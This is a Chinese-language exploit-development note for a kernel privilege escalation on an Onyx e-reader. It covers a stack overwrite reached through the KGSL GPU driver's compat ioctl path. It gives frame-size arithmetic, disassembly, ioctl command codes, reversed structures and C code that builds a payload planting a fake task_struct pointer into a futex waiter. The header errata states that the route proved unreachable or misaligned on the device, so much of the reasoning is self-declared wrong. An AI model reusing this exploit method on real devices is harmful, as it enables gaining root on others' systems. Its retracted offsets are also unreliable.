> **文档类型**: 技术文档 | **状态**: ⚠️ 历史分析 + 终局勘误 | **最后更新**: 2026-07-25

# KGSL Compat IOCTL 栈覆盖 — 技术文档

**漏洞**: CVE-2026-43499 (GhostLock)  
**目标**: Onyx Leaf5 (TabBoox), kernel 4.19.157  
**路由**: KGSL `/dev/kgsl-3d0` → `RB_ISSUEIBCMDS` / 相关 submit 路径

### 终局勘误（2026-07-25）

早期章节按「32-bit 16B CFU @ abs -0x328 与 waiter task 完美重叠」推算；  
**设备实测与精确帧重算后**：

| 路径 | 结果 |
|------|------|
| 32-bit `RB_ISSUEIBCMDS` | compat dispatch 拒绝，**无法到达** CFU |
| 32-bit CFU 理论位置 | 相对 `waiter->task` **过深**（非完美重叠） |
| 64-bit CFU | 可触发，相对 task **过浅 ~88B** |

权威结论见 [`../PROCESS_LOG.md`](../PROCESS_LOG.md) 步骤 40–44 与 [`../README.md`](../README.md)。  
下文保留调用链与结构体逆向笔记，供审计；**勿单独作为可行性结论**。

---

## 一、概述

qcedev_ioctl 路由因 `/dev/qce` 权限阻塞（0660 system:drmrpc）不可用。全局 CFU 扫描后曾聚焦 kgsl compat ioctl：

- `/dev/kgsl-3d0`: **0666**，shell 可 open
- 32-bit ARM 触发 `TIF_32BIT` → 16B CFU 路径（理论）
- 实际：32-bit issueibcmds 被 compat 表拒绝；64-bit 可触发但位差不匹配

---

## 二、调用链与深度

### 2.1 完整调用链

```
32-bit 用户态
  → ioctl(fd, IOCTL_KGSL_RB_ISSUEIBCMDS, &cmd32)
    → __arm64_compat_sys_ioctl       [frame 0x40]
      → do_vfs_ioctl                 [frame 0x90]
        → kgsl_compat_ioctl          [frame 0x30]
          → kgsl_ioctl_helper        [frame 0xD0]
            → kgsl_ioctl_rb_issueibcmds_compat  [frame 0x50]
              → kgsl_ioctl_rb_issueibcmds       [frame 0x70]
                → kgsl_drawobj_cmd_create       [frame 0x40]
                  → kgsl_drawobj_cmd_add_ibdesc [frame 0x40]
                    → kgsl_drawobj_cmd_add_ibdesc_list  [frame 0x90]
                      → CFU: 16B @ SP+0x28
```

### 2.2 深度计算

```
Caller depth D = 0x40 + 0x90 + 0x30 + 0xD0 + 0x50 + 0x70 + 0x40 + 0x40
               = 0x2C0

CFU 位置 = -(D + 0x90) + 0x28 = -(0x350) + 0x28 = -0x328
Waiter TASK  = -0x320
Waiter LOCK  = -0x318

覆盖: CFU[8:16] → abs [-0x320, -0x318) = TASK 指针 ✅
```

### 2.3 栈帧可视化

```
kernel_stack_top (abs 0x000)
├── __arm64_compat_sys_ioctl (0x40)          [-0x000, -0x040)
├── do_vfs_ioctl (0x90)                      [-0x040, -0x0D0)
├── kgsl_compat_ioctl (0x30)                 [-0x0D0, -0x100)
├── kgsl_ioctl_helper (0xD0)                 [-0x100, -0x1D0)
├── rb_issueibcmds_compat (0x50)             [-0x1D0, -0x220)
├── kgsl_ioctl_rb_issueibcmds (0x70)         [-0x220, -0x290)
├── kgsl_drawobj_cmd_create (0x40)           [-0x290, -0x2D0)
├── kgsl_drawobj_cmd_add_ibdesc (0x40)       [-0x2D0, -0x310)
├── kgsl_drawobj_cmd_add_ibdesc_list (0x90)  [-0x310, -0x3A0)
│   ├── CFU dest @ SP+0x28                   [-0x328, -0x318) ← 16B
│   │   ├── [0:8]  → pi_tree.left (waiter+0x28)
│   │   └── [8:16] → TASK          (waiter+0x30) ← 可控!
│   └── 其他局部变量
│
... [waiter 脏数据区] ...
├── [futex_wait 旧帧—waiter 在此]             [-0x350, -0x310)
│   ├── tree_entry       (0x00-0x17)          [脏数据: 原始值]
│   ├── pi_tree_entry    (0x18-0x2F)          [脏数据: 原始值]
│   ├── TASK             (0x30-0x37)          [覆盖: fake task_struct]
│   └── LOCK             (0x38-0x3F)          [脏数据: 原始 lock]
```

---

## 三、TIF_32BIT 路径选择

### 3.1 机制

`kgsl_drawobj_cmd_add_ibdesc_list` 中有两条 CFU 路径：

```asm
; Line 20-22: TIF_32BIT check
mrs  x24, sp_el0              ; x24 = current_thread_info()
ldr  x8, [x24]                ; x8 = thread_info.flags
tbnz w8, #0x16, .Lcompat_path ; if (flags & TIF_32BIT) goto compat

; 64-bit path (NOT USED for exploit):
cmp  w19, #1                  ; count check
b.lt error
mov  w23, #0x20               ; size = 32
add  x0, sp, #8               ; dest = SP+0x08 ← 位置不对!
bl   __arch_copy_from_user

.Lcompat_path:                ; ← TIF_32BIT triggers this!
cmp  w19, #1                  ; count check
b.lt error
mov  w23, #0x10               ; size = 16
sub  x0, x29, #0x18           ; dest = SP+0x40-0x18 = SP+0x28 ← TASK位置!
bl   __arch_copy_from_user
```

### 3.2 验证

- 32-bit ARM 进程运行在 aarch64 内核上时，内核自动设置 `TIF_32BIT`
- 编译为 `armv7a-linux-androideabi` 目标即可触发
- 已在设备上验证：32-bit 探针 ioctl 成功到达 handler

---

## 四、ioctl 命令码

### 4.1 编码格式

从 vmlinux `kgsl_ioctl_funcs` 表（0xffffff80099d2540）确认：

```
cmd = _IOC(RW, 0x09, nr, size)
    = 0xC0000000 | (size << 16) | (0x09 << 8) | nr

dispatch: table[cmd & 0xFF] → handler function
```

### 4.2 已验证命令

| 命令 | nr | size | cmd hex | Handler |
|------|-----|------|---------|---------|
| RB_ISSUEIBCMDS | 0x10 | 0x20 | `0xc0200910` | kgsl_ioctl_rb_issueibcmds |
| SUBMIT_COMMANDS | 0x3d | 0x60 | `0xc060093d` | kgsl_ioctl_submit_commands |
| GPU_AUX_COMMAND | 0x57 | 0x14 | `0xc0140957` | kgsl_ioctl_gpu_aux_command |

---

## 五、Compat 数据结构

### 5.1 输入结构

从 `kgsl_ioctl_rb_issueibcmds_compat` 反汇编还原：

```c
struct kgsl_ringbuffer_issueibcmds_compat {
    uint32_t drawctxt_id;    // +0x00 — GPU context ID
    uint32_t flags;          // +0x04 — flags
    uint32_t ibdesc_addr;    // +0x08 — 32-bit user pointer to ibdesc array
    uint32_t timestamp;      // +0x0c — writeback: timestamp result
    uint32_t numibs;         // +0x10 — number of ibdescs (must be >= 1)
};
// sizeof = 0x14 (20 bytes)
```

Compat wrapper 将其转换为 64-bit 内核结构后调用 regular handler。

### 5.2 ibdesc 结构（CFU payload）

```c
struct kgsl_ibdesc {
    uint64_t gpuaddr;       // [+0:8]  → waiter pi_tree.rb_left (设为 0)
    uint64_t sizedwords;    // [+8:16] → waiter TASK (fake task_struct addr)
};
// sizeof = 0x10 (16 bytes)
```

### 5.3 Exploit 数据构造

```c
struct kgsl_ibdesc ibdesc = {
    .gpuaddr    = 0,                    // pi_tree.left → 0 (NULL, 安全)
    .sizedwords = kaslr_fake_task_addr, // TASK → fake task_struct
};

struct kgsl_ringbuffer_issueibcmds_compat cmd = {
    .drawctxt_id = ctx_id,              // 有效 GPU context
    .flags       = 0,
    .ibdesc_addr = (uint32_t)(uintptr_t)&ibdesc,
    .timestamp   = 0,
    .numibs      = 1,                   // 至少 1 个 ibdesc
};
```

---

## 六、验证状态

| 检查项 | 状态 | 方法 |
|--------|------|------|
| /dev/kgsl-3d0 权限 | ✅ 0666 | `adb shell ls -la` |
| 32-bit open 成功 | ✅ fd=3 | 探针实测 |
| ioctl dispatch | ✅ EINVAL | 9 命令均分派（非 ENOTTY） |
| CFU 位置对齐 | ✅ 数学验证 | abs 计算 + 反汇编确认 |
| TIF_32BIT 路径 | ✅ 反汇编 | tbnz w8, #0x16 条件 |
| pre-CFU 校验 | ✅ 仅 access_ok | 反汇编确认无语义验证 |
| GPU context | ⚠️ 需创建 | IOCTL_KGSL_DRAWCTXT_CREATE |

---

## 七、与 qcedev_ioctl 路由对比

| 维度 | qcedev_ioctl | kgsl compat |
|------|-------------|-------------|
| 设备 | `/dev/qce` (234:0) | `/dev/kgsl-3d0` (237:0) |
| 权限 | 0660 drmrpc ❌ | 0666 ✅ |
| 覆盖 | FULL 64B | TASK 8B |
| 编译 | 64-bit ARM | **32-bit ARM** |
| ioctl 结构 | qcedev_enc_req (328B) | ibdesc (16B) + cmd (20B) |
| CFU 深度 | 0x3B0 | 0x328 |
| TASK 覆盖 | ✅ | ✅ |
| LOCK 覆盖 | ✅ | ❌ (脏数据) |

---

*最后更新: 2026-07-24*
